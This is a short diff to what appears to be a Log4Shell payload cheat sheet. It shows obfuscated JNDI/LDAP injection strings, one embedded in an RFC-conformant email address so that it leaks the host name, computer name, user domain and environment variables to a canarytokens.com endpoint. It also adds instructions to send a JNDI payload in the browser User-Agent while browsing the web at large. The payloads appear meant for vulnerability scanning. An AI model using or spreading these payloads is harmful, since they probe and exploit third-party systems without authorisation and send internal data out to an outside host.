@@ -104,6 +104,12 @@ test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//
 RFC conform Email Payload:
 ```c
 test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.L4J.TOKEN.canarytokens.com/a})@foobar.com
+
+Triggering the Canary Token by using User-Agent Switcher:
+URL: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/
+Payload: `${jndi:ldap://TOKEN.canarytokens.com/a}`
+
+Fire in the hole aka start browsing the web!
 ```
 
 ### Vulnerability Scanning
